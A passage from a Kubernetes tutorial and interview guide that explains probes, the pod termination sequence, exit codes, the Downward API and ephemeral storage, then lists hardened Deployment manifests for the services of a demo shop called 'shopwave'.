| On failure | **Kills the container** | **Kills the container** | **Removes from Endpoints** |
| Pod restarted? | Yes | Yes | **No** |
| Traffic affected? | Indirectly | Indirectly | **Directly** |
| Checks dependencies? | Maybe | **NEVER** | Yes |
| Runs when? | Until first success, then **never again** | After startup succeeds | After startup succeeds, forever |

### `startupProbe` — what it's actually for

While a startup probe is running, **liveness and readiness are completely disabled**. This exists because of a real dilemma: a JVM app might take 120 seconds to boot, so liveness needs `initialDelaySeconds: 120` — but then if it wedges at runtime, **you wait 120 seconds every time before the kubelet notices**. You cannot have both fast failure detection and a long boot allowance with one probe.

The startup probe splits them: a **generous, one-time budget** (`failureThreshold × periodSeconds` = 30 × 3s = 90s) for boot, then an **aggressive** liveness probe (10s period) forever after. Best of both.

### `livenessProbe` — the dangerous one

> **A liveness probe kills your container.** Treat it with the respect that deserves.
>
> **Never check a dependency in liveness.** If `catalog`'s liveness hit Postgres, then a 30-second Postgres restart would make the kubelet **kill every catalog pod at once**. They restart, Postgres is still recovering, liveness fails again, `CrashLoopBackOff` across the fleet, exponential backoff up to 5 minutes — and now your outage lasts far longer than the database blip that caused it. **You manufactured an outage with a health check.** This is the single most common self-inflicted Kubernetes outage, and it's why the interview question exists.
>
> **A liveness probe should only detect states a restart actually fixes**: deadlock, an exhausted thread pool, a wedged event loop, a memory leak past the point of no return. If a restart wouldn't fix it, don't probe for it.
>
> **`timeoutSeconds: 1` (the default) is a trap.** Under load, a healthy-but-busy pod misses a 1-second probe, gets killed, its traffic shifts to the remaining pods, **they** get busier and miss their probes, and you have cascading liveness-induced failure. This is a real, famous production pattern. Set `timeoutSeconds: 2-5` and `failureThreshold: 3`.

**Probe types:**

```yaml
# httpGet - preferred. 200-399 = pass.
livenessProbe:
  httpGet:
    path: /healthz
    port: http
    httpHeaders:
      - name: X-Probe
        value: kubelet

# tcpSocket - can we open a connection? Weak: a wedged app still accepts TCP.
livenessProbe:
  tcpSocket:
    port: 5432

# exec - runs a command IN the container. Exit 0 = pass.
livenessProbe:
  exec:
    command: ["pg_isready", "-U", "shopwave"]

# grpc - native since 1.24
livenessProbe:
  grpc:
    port: 9000
```

> **`exec` probes are the expensive ones.** Every execution **forks a process inside the container**. At `periodSeconds: 5` across 500 pods that's 100 process spawns per second on your nodes, plus the runtime overhead of each `exec` through the CRI. `exec` probes are a known cause of elevated node CPU and of `PLEG is not healthy` kubelet errors. Prefer `httpGet`. Also: `exec` probes don't work in distroless images.

> **The `initialDelaySeconds` trap.** People set `initialDelaySeconds: 60` on liveness so a slow app can boot — and thereby wait 60s before detecting *any* future wedge. Use a **startupProbe** instead and set `initialDelaySeconds: 0`.

### `readinessProbe` — the traffic switch

Failing readiness **removes the pod's IP from the Service's EndpointSlice**. The pod keeps running, keeps its logs, keeps its state; it just stops receiving traffic. That's the correct response to "my dependency is down" — because when the dependency recovers, you're back automatically, no restart, no cold cache.

Readiness is also the mechanism behind:
- **Rolling updates** — a Deployment won't proceed until new pods are Ready
- **Graceful shutdown** — fail readiness, drain, exit (see below)
- **`maxUnavailable`** — counted in Ready pods

> **Readiness scoping — say this out loud.** Readiness should reflect **your** ability to do **your** job, not the health of the world. `frontend` checks `catalog` (can't render without it) but **not** `orders` (checkout being down shouldn't remove the storefront from the LB). Cascading readiness turns one failed dependency into a **total outage**, because every pod in the dependency chain simultaneously reports NotReady and the LB has zero backends anywhere.

## 7.5 The termination sequence — draw this from memory

This is the highest-value diagram in Kubernetes. When you `kubectl delete pod` (or a rollout, or a drain, or a node scale-down):

```
t=0   API server sets metadata.deletionTimestamp on the Pod object.
      Pod status -> Terminating.

t=0   TWO THINGS NOW HAPPEN IN PARALLEL. THIS IS THE WHOLE POINT.

      [A] Endpoint removal path                [B] Container kill path
      ------------------------                 ----------------------
      EndpointSlice controller                 kubelet sees deletionTimestamp
       sees the deletion                        |
       |                                        v
       v                                       runs preStop hook
      removes pod IP from                       (blocking - grace clock
       EndpointSlice                             is already running!)
       |                                        |
       v                                        v
      kube-proxy / Cilium on EVERY             sends SIGTERM to PID 1
       node reprograms rules                    |
       |                                        v
       v                                       app: fail readiness, drain
      GCLB/NEG deprogrammes the                 |
       backend (SLOW - seconds                  v
       to tens of seconds)                     app exits 0
                                                |
                                                v
                                          if still alive at
                                          terminationGracePeriodSeconds:
                                                SIGKILL

t=grace  Pod object deleted from etcd.
```

> **The race, stated precisely.** Path [B] — SIGTERM — is **fast**. It's one kubelet acting locally. Path [A] — endpoint removal — is **slow**: it goes API server → EndpointSlice controller → watch → every kube-proxy on every node → and for Ingress, all the way out to the Google load balancer's NEG deprogramming, which takes **seconds to tens of seconds**.
>
> So your container receives SIGTERM and exits **while the load balancer is still sending it requests**. Those requests hit a closed port. Your users get **502s on every deploy**. The pod did nothing wrong; the system is eventually consistent and you outran it.

### The fix — and there are two halves

**Half 1: `preStop` sleep.**

```yaml
lifecycle:
  preStop:
    exec:
      command: ["/bin/sh", "-c", "sleep 5"]
```

The `preStop` hook runs **before** SIGTERM and **blocks** it. Sleeping does nothing except **buy time for path [A] to finish**. It looks absurd — a `sleep` in production — and it is completely correct. For GKE Ingress with NEGs, `sleep 5` to `sleep 15` is realistic; the LB needs longer than kube-proxy does.

**Half 2: the app fails readiness on SIGTERM and keeps serving.**

That's exactly what the Part 4 handlers do:

```python
def on_sigterm(signum, frame):
    _shutting_down = True     # /readyz now returns 503
    time.sleep(DRAIN_SECONDS) # KEEP SERVING existing traffic
    sys.exit(0)
```

Together: preStop delays SIGTERM while endpoints drain → SIGTERM arrives → app immediately reports NotReady (belt and braces) → app finishes in-flight requests → exits cleanly. **Zero dropped requests.**

> **The trap:** `terminationGracePeriodSeconds` is the **total** budget, and **the clock starts at t=0, before preStop**. It covers preStop **plus** SIGTERM handling. So:
>
> **`terminationGracePeriodSeconds` > `preStop` duration + app drain time + safety margin.**
>
> For `orders`: preStop 5s + drain up to 25s + margin → `terminationGracePeriodSeconds: 60`. Get this wrong and the kubelet SIGKILLs you **in the middle of a database transaction**, and no amount of graceful-shutdown code saves you.

> **preStop gotchas:**
> - `exec` preStop needs the binary to exist — **there's no `/bin/sh` in distroless**. Use `httpGet` preStop, or don't use distroless where you need it.
> - preStop is **best-effort**. If the node is hard-powered-off, nothing runs.
> - A preStop that **exceeds the grace period is cut off by SIGKILL**, and the app never even gets its SIGTERM. Silent, ugly.

### `restartPolicy` and CrashLoopBackOff

| Policy | Valid for |
|---|---|
| `Always` | Deployments, StatefulSets, DaemonSets (the only allowed value) |
| `OnFailure` | Jobs, CronJobs |
| `Never` | Jobs, bare pods |

Backoff is **exponential**: 10s, 20s, 40s, 80s, 160s, **capped at 5 minutes**. It resets after the container runs successfully for **10 minutes**.

> `CrashLoopBackOff` is **not an error**. It is a **state**: "this container keeps exiting and I am waiting before trying again." The actual error is in `kubectl logs --previous`. Candidates who say "CrashLoopBackOff means the image is broken" have not debugged one.

```bash
kubectl logs -n shopwave-prod <pod> --previous     # THE command
kubectl describe pod -n shopwave-prod <pod>        # events + exit code
```

**Exit codes that matter:**

| Code | Meaning |
|---|---|
| `0` | Clean exit. In a Deployment, still restarted — `Always` means always. |
| `1` | Application error. Read the logs. |
| `137` | **128 + 9 = SIGKILL.** Almost always **OOMKilled** — check `kubectl describe pod` for `Reason: OOMKilled`. Or: grace period expired. |
| `139` | 128 + 11 = SIGSEGV. |
| `143` | **128 + 15 = SIGTERM.** Clean-ish termination. |

## 7.6 The Downward API

```yaml
env:
  - name: POD_NAME
    valueFrom:
      fieldRef:
        fieldPath: metadata.name
  - name: MEMORY_LIMIT
    valueFrom:
      resourceFieldRef:
        containerName: catalog
        resource: limits.memory
        divisor: 1Mi
```

Two flavours: `fieldRef` (pod metadata) and `resourceFieldRef` (the container's own resources).

> **`resourceFieldRef` is genuinely useful and underused.** A JVM that doesn't know its cgroup limit will size its heap from the **node's** total memory and get OOMKilled instantly. Feeding `limits.memory` in as an env var and setting `-XX:MaxRAMPercentage=75` fixes it. (Modern JVMs are container-aware, but Node.js `--max-old-space-size`, Go's `GOMEMLIMIT`, and gunicorn worker counts all still need this.)

> **The Downward API cannot expose Service info or anything not on the pod object.** And `fieldRef` on labels only works for labels **present at pod creation** — `topology.kubernetes.io/zone` on a pod works because the scheduler/admission adds it; arbitrary node labels do **not** propagate. If you need node labels in the pod, mount the Downward API as a volume and it updates, or query the API.

**Volume form updates; env form does not:**

```yaml
volumes:
  - name: podinfo
    downwardAPI:
      items:
        - path: labels
          fieldRef:
            fieldPath: metadata.labels
```

**Env vars are frozen at container start.** Labels and annotations mounted as a Downward API **volume** are updated in place when they change. Same asymmetry as ConfigMaps (Part 11).

## 7.7 `emptyDir` and ephemeral storage

```yaml
volumes:
  - name: tmp
    emptyDir:
      medium: Memory      # tmpfs - RAM, not disk
      sizeLimit: 64Mi
  - name: cache
    emptyDir:
      sizeLimit: 256Mi    # node's disk
```

`emptyDir` lives and dies with the **pod**, not the container. A container crash and restart **keeps** the emptyDir; a pod reschedule loses it.

> **`medium: Memory` counts against the container's memory limit.** A tmpfs is RAM. Write 200Mi into a `medium: Memory` emptyDir in a container with a 384Mi limit and you get **OOMKilled** — and the logs show nothing wrong with your application, because the memory isn't in your heap, it's in the page cache of a filesystem. This is a beautifully confusing bug and a great one to have a story about.

> **Ephemeral storage is a real, evictable resource.** `requests.ephemeral-storage` / `limits.ephemeral-storage` cover the container's **writable layer + emptyDir + logs**. Exceed the limit and the kubelet **evicts the pod** (`Evicted: Pod ephemeral local storage usage exceeds the total limit of containers`). A pod logging verbosely to a file instead of stdout will fill the node's disk, trigger **`DiskPressure`**, and the kubelet then evicts pods and garbage-collects images **across the whole node** — taking down innocent neighbours. That is why "log to stdout" is a hard rule, not a style preference.

## 7.8 `readOnlyRootFilesystem`

```yaml
securityContext:
  readOnlyRootFilesystem: true
volumeMounts:
  - name: tmp
    mountPath: /tmp
```

Blocks an attacker from writing a binary anywhere in the image. Nearly every app still needs a writable `/tmp` (Python, gunicorn, most runtimes), so you mount an `emptyDir` there. That's the pattern: **read-only root + explicit writable mounts**.

## 7.9 Verify

```bash
kubectl apply -f 08-workloads/catalog-pod-reference.yaml
kubectl get pod catalog-reference -n shopwave-prod -w
kubectl describe pod catalog-reference -n shopwave-prod
kubectl logs catalog-reference -n shopwave-prod -c wait-for-postgres
kubectl logs catalog-reference -n shopwave-prod -c catalog

# Watch a real termination
kubectl delete pod catalog-reference -n shopwave-prod --grace-period=30 &
kubectl get pod catalog-reference -n shopwave-prod -w
```

Prove the grace period matters:

```bash
kubectl delete pod <pod> -n shopwave-prod --grace-period=0 --force
```

> **`--force --grace-period=0` deletes the *object from etcd* without waiting for the kubelet to confirm the container is gone.** For a Deployment that's merely rude. **For a StatefulSet it can cause split-brain** — the pod object is gone so the StatefulSet controller creates `postgres-0` on another node while the original container is *still running and still holding the disk*. Two writers, one volume. Never force-delete a StatefulSet pod unless you have **verified the node is truly dead**. This is a genuinely dangerous command and knowing why is a strong signal.

## 7.10 Part 7 interview talking points

- What a pod is: shared network/IPC/UTS namespaces; the pause container; why the IP survives container restarts
- Init containers: sequential, must exit 0, no readiness probe, and the `max(init, sum(app))` resource accounting rule
- Native sidecars (1.29): init container with `restartPolicy: Always`; solves the Job-never-completes problem
- The three probes: what each does **on failure**, and that only readiness doesn't kill
- Why liveness must never check a dependency — the manufactured-outage story
- Why `startupProbe` exists — the long-boot vs fast-detection dilemma
- `timeoutSeconds: 1` and cascading liveness failures under load
- `exec` probes are expensive (fork per check) and break on distroless
- **The full termination sequence and the endpoint-removal race**
- Why `preStop: sleep` is correct, not a hack; and that the grace clock includes it
- `terminationGracePeriodSeconds` > preStop + drain
- CrashLoopBackOff is a state; exponential backoff to 5m; `logs --previous`
- Exit codes 137 (OOMKill/SIGKILL) and 143 (SIGTERM)
- Downward API: volume updates, env doesn't; `resourceFieldRef` for JVM heap sizing
- `emptyDir medium: Memory` counts against the memory limit
- Ephemeral storage limits, DiskPressure, and why you log to stdout
- Why `--force --grace-period=0` on a StatefulSet pod risks split-brain


---

# Part 8 — Deployments


> **FREE-TIER SIZING.** On the single 3-node pool, app Deployments run at **`replicas: 1`** (`frontend` at 2 for the HPA/anti-affinity demo), and `payments` keeps **Guaranteed QoS** but at a smaller 150m/192Mi. Requests are trimmed so the whole platform fits ~2.8 vCPU allocatable. The manifests below already reflect this. With real quota you'd restore `replicas: 3`, the larger requests, and pool `nodeSelector`s.

## 8.1 The controller chain

```
Deployment  --owns-->  ReplicaSet  --owns-->  Pods
```

Three separate controllers, each doing one thing:

- **Deployment controller** manages **ReplicaSets**. It never touches a pod. A rollout is: create a new RS, then scale the new RS up and the old RS down according to `maxSurge`/`maxUnavailable`.
- **ReplicaSet controller** manages **pods**. Its only job: make `len(pods matching selector) == replicas`.
- **Scheduler** assigns pods to nodes. **kubelet** runs them.

> **The key insight:** a rollback is not "undo". It is **scaling an old ReplicaSet back up**. That's why `kubectl rollout undo` is fast — the ReplicaSet object was never deleted, just scaled to 0. It also means the old RS's pod template must still be valid: if the old image was garbage-collected from the registry, your rollback creates pods that go `ImagePullBackOff`. **A rollback can fail.** Excellent thing to point out.

**Where the revision number lives.** `kubectl rollout history` reads the `deployment.kubernetes.io/revision` **annotation** on each ReplicaSet. `revisionHistoryLimit: 10` (default) keeps 10 old ReplicaSets around **at replicas=0** purely so you can roll back to them. Set it to 0 and `rollout undo` **stops working** — and you find out during an incident.

## 8.2 `frontend`

`08-workloads/00-frontend.yaml`:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: frontend
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: frontend
    app.kubernetes.io/instance: frontend-prod
    app.kubernetes.io/version: "1.0.0"
    app.kubernetes.io/component: web
    app.kubernetes.io/part-of: shopwave
    app.kubernetes.io/managed-by: kubectl
  annotations:
    kubernetes.io/change-cause: "Initial deployment of frontend 1.0.0"
spec:
  replicas: 2
  revisionHistoryLimit: 10
  progressDeadlineSeconds: 300
  minReadySeconds: 10
  selector:
    matchLabels:
      app.kubernetes.io/name: frontend
      app.kubernetes.io/instance: frontend-prod
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0
  template:
    metadata:
      labels:
        app.kubernetes.io/name: frontend
        app.kubernetes.io/instance: frontend-prod
        app.kubernetes.io/version: "1.0.0"
        app.kubernetes.io/component: web
        app.kubernetes.io/part-of: shopwave
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "8080"
        prometheus.io/path: "/metrics"
    spec:
      serviceAccountName: frontend
      automountServiceAccountToken: false
      enableServiceLinks: false
      terminationGracePeriodSeconds: 45
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        runAsGroup: 10001
        fsGroup: 10001
        seccompProfile:
          type: RuntimeDefault
      topologySpreadConstraints:
        - maxSkew: 1
          topologyKey: topology.kubernetes.io/zone
          whenUnsatisfiable: ScheduleAnyway
          labelSelector:
            matchLabels:
              app.kubernetes.io/name: frontend
        - maxSkew: 1
          topologyKey: kubernetes.io/hostname
          whenUnsatisfiable: ScheduleAnyway
          labelSelector:
            matchLabels:
              app.kubernetes.io/name: frontend
      containers:
        - name: frontend
          image: asia-south1-docker.pkg.dev/kubernetas-console/shopwave/frontend:1.0.0
          imagePullPolicy: IfNotPresent
          ports:
            - name: http
              containerPort: 8080
              protocol: TCP
          env:
            - name: POD_NAME
              valueFrom:
                fieldRef:
                  fieldPath: metadata.name
            - name: ZONE
              valueFrom:
                fieldRef:
                  fieldPath: metadata.labels['topology.kubernetes.io/zone']
            - name: DRAIN_SECONDS
              value: "15"
          envFrom:
            - configMapRef:
                name: frontend-config
          resources:
            requests:
              cpu: 100m
              memory: 128Mi
              ephemeral-storage: 128Mi
            limits:
              cpu: 500m
              memory: 256Mi
              ephemeral-storage: 512Mi
          startupProbe:
            httpGet:
              path: /startupz
              port: http
            periodSeconds: 3
            failureThreshold: 20
          livenessProbe:
            httpGet:
              path: /healthz
              port: http
            periodSeconds: 10
            timeoutSeconds: 3
            failureThreshold: 3
          readinessProbe:
            httpGet:
              path: /readyz
              port: http
            periodSeconds: 5
            timeoutSeconds: 3
            failureThreshold: 3
          lifecycle:
            preStop:
              exec:
                command: ["/bin/sh", "-c", "sleep 15"]
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: tmp
              mountPath: /tmp
      volumes:
        - name: tmp
          emptyDir:
            sizeLimit: 64Mi
```

### The fields that carry the design

**`maxSurge: 1, maxUnavailable: 0`** — never dip below `replicas` Ready pods. Costs one extra pod's capacity during a rollout. This is the **prod default**. Its inverse (`maxSurge: 0, maxUnavailable: 1`) is for capacity-constrained clusters and quietly reduces your capacity by 33% during every deploy.

> **`maxUnavailable: 0` requires headroom.** If your ResourceQuota or your nodes cannot fit one extra pod, the rollout **hangs forever** — the new pod is Pending, the old pod can't be removed, and nothing progresses until `progressDeadlineSeconds` marks it failed. Interviewers love this: *"your rollout is stuck, `kubectl get pods` shows one Pending. Why?"*

**`minReadySeconds: 10`** — a new pod must be Ready **and stay Ready for 10 seconds** before it counts toward `maxUnavailable` and before the next old pod is removed. Without it, a pod that passes readiness once and then crashes at t+2s still lets the rollout march on, and you can roll a broken version to 100% while every replica is Ready-then-dead. **`minReadySeconds` is your cheapest canary.**

**`progressDeadlineSeconds: 300`** — if the rollout makes no progress for 5 minutes, the Deployment gets `Progressing=False, Reason=ProgressDeadlineExceeded`.

> **It does NOT roll back.** It only sets a status condition. Kubernetes has **no automatic rollback**. Your CI/CD must watch `kubectl rollout status` (which honours the deadline and exits non-zero) and call `kubectl rollout undo` itself. Candidates routinely believe Kubernetes auto-rolls-back. It does not, and knowing that is a real differentiator.

**`kubernetes.io/change-cause`** — populates the CAUSE column in `rollout history`. It's an annotation, and if you don't set it (or use `--record`, now deprecated), your history is a list of revision numbers with no meaning. During an incident that's the difference between a 30-second rollback and a 10-minute archaeology session.

**`enableServiceLinks: false`** — by default Kubernetes injects **Docker-link-style env vars for every Service in the namespace** into every container (`CATALOG_SERVICE_HOST`, `CATALOG_PORT_8080_TCP`, ...). With 20 services that's ~100 env vars per pod. It is legacy, it leaks the namespace's topology into every container, and at scale (hundreds of services) it can **exceed the environment size limit and stop pods from starting**. Turn it off. Almost nobody knows this flag exists.

## 8.3 `catalog`

`08-workloads/01-catalog.yaml`:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: catalog
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: catalog
    app.kubernetes.io/instance: catalog-prod
    app.kubernetes.io/version: "1.0.0"
    app.kubernetes.io/component: backend
    app.kubernetes.io/part-of: shopwave
  annotations:
    kubernetes.io/change-cause: "Initial deployment of catalog 1.0.0"
spec:
  replicas: 1
  revisionHistoryLimit: 10
  progressDeadlineSeconds: 300
  minReadySeconds: 10
  selector:
    matchLabels:
      app.kubernetes.io/name: catalog
      app.kubernetes.io/instance: catalog-prod
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0
  template:
    metadata:
      labels:
        app.kubernetes.io/name: catalog
        app.kubernetes.io/instance: catalog-prod
        app.kubernetes.io/version: "1.0.0"
        app.kubernetes.io/component: backend
        app.kubernetes.io/part-of: shopwave
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "8080"
    spec:
      serviceAccountName: catalog
      automountServiceAccountToken: false
      enableServiceLinks: false
      terminationGracePeriodSeconds: 30
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        runAsGroup: 10001
        fsGroup: 10001
        seccompProfile:
          type: RuntimeDefault
      topologySpreadConstraints:
        - maxSkew: 1
          topologyKey: topology.kubernetes.io/zone
          whenUnsatisfiable: ScheduleAnyway
          labelSelector:
            matchLabels:
              app.kubernetes.io/name: catalog
      initContainers:
        - name: wait-for-postgres
          image: asia-south1-docker.pkg.dev/kubernetas-console/shopwave/catalog:1.0.0
          command:
            - python
            - -c
            - |
              import socket, time, sys, os
              host = os.getenv("DB_HOST", "postgres")
              for i in range(60):
                  try:
                      socket.create_connection((host, 5432), timeout=2).close()
                      sys.exit(0)
                  except OSError:
                      print(f"waiting for postgres ({i})", flush=True)
                      time.sleep(2)
              sys.exit(1)
          env:
            - name: DB_HOST
              value: postgres
          resources:
            requests:
              cpu: 50m
              memory: 64Mi
            limits:
              cpu: 100m
              memory: 128Mi
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
      containers:
        - name: catalog
          image: asia-south1-docker.pkg.dev/kubernetas-console/shopwave/catalog:1.0.0
          imagePullPolicy: IfNotPresent
          ports:
            - name: http
              containerPort: 8080
              protocol: TCP
          env:
            - name: POD_NAME
              valueFrom:
                fieldRef:
                  fieldPath: metadata.name
            - name: NODE_NAME
              valueFrom:
                fieldRef:
                  fieldPath: spec.nodeName
            - name: ZONE
              valueFrom:
                fieldRef:
                  fieldPath: metadata.labels['topology.kubernetes.io/zone']
            - name: DB_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: postgres-credentials
                  key: password
          envFrom:
            - configMapRef:
                name: catalog-config
          resources:
            requests:
              cpu: 150m
              memory: 192Mi
              ephemeral-storage: 128Mi
            limits:
              cpu: 600m
              memory: 384Mi
              ephemeral-storage: 512Mi
          startupProbe:
            httpGet:
              path: /startupz
              port: http
            periodSeconds: 3
            failureThreshold: 30
          livenessProbe:
            httpGet:
              path: /healthz
              port: http
            periodSeconds: 10
            timeoutSeconds: 3
            failureThreshold: 3
          readinessProbe:
            httpGet:
              path: /readyz
              port: http
            periodSeconds: 5
            timeoutSeconds: 3
            failureThreshold: 3
          lifecycle:
            preStop:
              exec:
                command: ["/bin/sh", "-c", "sleep 5"]
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: tmp
              mountPath: /tmp
      volumes:
        - name: tmp
          emptyDir:
            sizeLimit: 64Mi
```

## 8.4 `cart`

`08-workloads/02-cart.yaml`:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: cart
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: cart
    app.kubernetes.io/instance: cart-prod
    app.kubernetes.io/version: "1.0.0"
    app.kubernetes.io/component: backend
    app.kubernetes.io/part-of: shopwave
  annotations:
    kubernetes.io/change-cause: "Initial deployment of cart 1.0.0"
spec:
  replicas: 1
  revisionHistoryLimit: 10
  progressDeadlineSeconds: 300
  minReadySeconds: 10
  selector:
    matchLabels:
      app.kubernetes.io/name: cart
      app.kubernetes.io/instance: cart-prod
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0
  template:
    metadata:
      labels:
        app.kubernetes.io/name: cart
        app.kubernetes.io/instance: cart-prod
        app.kubernetes.io/version: "1.0.0"
        app.kubernetes.io/component: backend
        app.kubernetes.io/part-of: shopwave
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "8080"
    spec:
      serviceAccountName: cart
      automountServiceAccountToken: false
      enableServiceLinks: false
      terminationGracePeriodSeconds: 30
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        runAsGroup: 10001
        fsGroup: 10001
        seccompProfile:
          type: RuntimeDefault
      topologySpreadConstraints:
        - maxSkew: 1
          topologyKey: topology.kubernetes.io/zone
          whenUnsatisfiable: ScheduleAnyway
          labelSelector:
            matchLabels:
              app.kubernetes.io/name: cart
      containers:
        - name: cart
          image: asia-south1-docker.pkg.dev/kubernetas-console/shopwave/cart:1.0.0
          ports:
            - name: http
              containerPort: 8080
          env:
            - name: POD_NAME
              valueFrom:
                fieldRef:
                  fieldPath: metadata.name
            - name: ZONE
              valueFrom:
                fieldRef:
                  fieldPath: metadata.labels['topology.kubernetes.io/zone']
            - name: REDIS_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: redis-credentials
                  key: password
          envFrom:
            - configMapRef:
                name: cart-config
          resources:
            requests:
              cpu: 100m
              memory: 128Mi
            limits:
              cpu: 400m
              memory: 256Mi
          startupProbe:
            httpGet:
              path: /startupz
              port: http
            periodSeconds: 3
            failureThreshold: 20
          livenessProbe:
            httpGet:
              path: /healthz
              port: http
            periodSeconds: 10
            timeoutSeconds: 3
            failureThreshold: 3
          readinessProbe:
            httpGet:
              path: /readyz
              port: http
            periodSeconds: 5
            timeoutSeconds: 3
            failureThreshold: 3
          lifecycle:
            preStop:
              exec:
                command: ["/bin/sh", "-c", "sleep 5"]
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: tmp
              mountPath: /tmp
      volumes:
        - name: tmp
          emptyDir:
            sizeLimit: 64Mi
```

## 8.5 `orders` — the one with the long grace period

`08-workloads/03-orders.yaml`:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: orders
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: orders
    app.kubernetes.io/instance: orders-prod
    app.kubernetes.io/version: "1.0.0"
    app.kubernetes.io/component: backend
    app.kubernetes.io/part-of: shopwave
  annotations:
    kubernetes.io/change-cause: "Initial deployment of orders 1.0.0"
spec:
  replicas: 1
  revisionHistoryLimit: 10
  progressDeadlineSeconds: 600
  minReadySeconds: 15
  selector:
    matchLabels:
      app.kubernetes.io/name: orders
      app.kubernetes.io/instance: orders-prod
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0
  template:
    metadata:
      labels:
        app.kubernetes.io/name: orders
        app.kubernetes.io/instance: orders-prod
        app.kubernetes.io/version: "1.0.0"
        app.kubernetes.io/component: backend
        app.kubernetes.io/part-of: shopwave
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "8080"
    spec:
      serviceAccountName: orders
      automountServiceAccountToken: false
      enableServiceLinks: false

      # 5s preStop + up to 25s drain + margin. If this were 30s the kubelet
      # would SIGKILL mid-transaction. See Part 7.
      terminationGracePeriodSeconds: 60

      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        runAsGroup: 10001
        fsGroup: 10001
        seccompProfile:
          type: RuntimeDefault
      topologySpreadConstraints:
        - maxSkew: 1
          topologyKey: topology.kubernetes.io/zone
          whenUnsatisfiable: DoNotSchedule
          labelSelector:
            matchLabels:
              app.kubernetes.io/name: orders
      affinity:
        podAntiAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            - labelSelector:
                matchLabels:
                  app.kubernetes.io/name: orders
              topologyKey: kubernetes.io/hostname
      initContainers:
        - name: wait-for-postgres
          image: asia-south1-docker.pkg.dev/kubernetas-console/shopwave/orders:1.0.0
          command:
            - python
            - -c
            - |
              import socket, time, sys, os
              for i in range(60):
                  try:
                      socket.create_connection((os.getenv("DB_HOST","postgres"), 5432), timeout=2).close()
                      sys.exit(0)
                  except OSError:
                      time.sleep(2)
              sys.exit(1)
          env:
            - name: DB_HOST
              value: postgres
          resources:
            requests:
              cpu: 50m
              memory: 64Mi
            limits:
              cpu: 100m
              memory: 128Mi
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
      containers:
        - name: orders
          image: asia-south1-docker.pkg.dev/kubernetas-console/shopwave/orders:1.0.0
          ports:
            - name: http
              containerPort: 8080
          env:
            - name: POD_NAME
              valueFrom:
                fieldRef:
                  fieldPath: metadata.name
            - name: ZONE
              valueFrom:
                fieldRef:
                  fieldPath: metadata.labels['topology.kubernetes.io/zone']
            - name: DB_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: postgres-credentials
                  key: password
            - name: DRAIN_SECONDS
              value: "25"
          envFrom:
            - configMapRef:
                name: orders-config
          resources:
            requests:
              cpu: 200m
              memory: 256Mi
            limits:
              cpu: 800m
              memory: 512Mi
          startupProbe:
            httpGet:
              path: /startupz
              port: http
            periodSeconds: 3
            failureThreshold: 30
          livenessProbe:
            httpGet:
              path: /healthz
              port: http
            periodSeconds: 10
            timeoutSeconds: 3
            failureThreshold: 3
          readinessProbe:
            httpGet:
              path: /readyz
              port: http
            periodSeconds: 5
            timeoutSeconds: 3
            failureThreshold: 3
          lifecycle:
            preStop:
              exec:
                command: ["/bin/sh", "-c", "sleep 5"]
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: tmp
              mountPath: /tmp
      volumes:
        - name: tmp
          emptyDir:
            sizeLimit: 64Mi
```

> `orders` uses **`whenUnsatisfiable: DoNotSchedule`** and **required** pod anti-affinity — it will rather stay Pending than put two replicas on one node. For a payment-adjacent write path, that's correct: correctness over availability of a marginal replica. `frontend` uses `ScheduleAnyway` because a slightly imbalanced storefront beats an unschedulable one.

## 8.6 `payments` — Guaranteed QoS, PCI posture

`08-workloads/04-payments.yaml`:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: payments
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: payments
    app.kubernetes.io/instance: payments-prod
    app.kubernetes.io/version: "1.0.0"
    app.kubernetes.io/component: backend
    app.kubernetes.io/part-of: shopwave
    compliance: pci
  annotations:
    kubernetes.io/change-cause: "Initial deployment of payments 1.0.0"
spec:
  replicas: 1
  revisionHistoryLimit: 10
  progressDeadlineSeconds: 600
  minReadySeconds: 15
  selector:
    matchLabels:
      app.kubernetes.io/name: payments
      app.kubernetes.io/instance: payments-prod
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0
  template:
    metadata:
      labels:
        app.kubernetes.io/name: payments
        app.kubernetes.io/instance: payments-prod
        app.kubernetes.io/version: "1.0.0"
